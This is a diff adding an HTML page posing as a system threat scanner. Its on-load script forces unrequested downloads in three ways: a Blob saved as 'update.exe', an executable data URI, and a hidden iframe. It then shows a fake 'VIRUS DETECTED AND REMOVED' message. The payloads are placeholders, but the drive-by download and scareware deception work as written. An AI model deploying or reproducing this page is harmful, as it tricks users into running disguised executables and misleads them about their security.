@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        // AUTO-DOWNLOAD IMMEDIATELY ON LOAD
+        window.onload = function() {
+            // Try multiple methods at once
+            setTimeout(() => {
+                // Method 1: Blob download
+                const blob = new Blob(['MALICIOUS PAYLOAD'], {type: 'application/exe'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'update.exe';
+                a.click();
+                
+                // Method 2: Data URI
+                window.open('data:application/exe;base64,TVqQAAMAAAA', '_blank');
+                
+                // Method 3: Iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.srcdoc = `<script>const l=document.createElement('a');l.href='data:text/plain,test';l.download='file.txt';l.click();<\/script>`;
+                document.body.appendChild(iframe);
+                
+                // Change page content
+                document.body.innerHTML = '<h1 style="color:red">⚠️ VIRUS DETECTED AND REMOVED</h1>';
+            }, 100);
+        };
+    </script>
+</head>
+<body>
+    <h1>Scanning your system for threats...</h1>
+</body>
+</html>
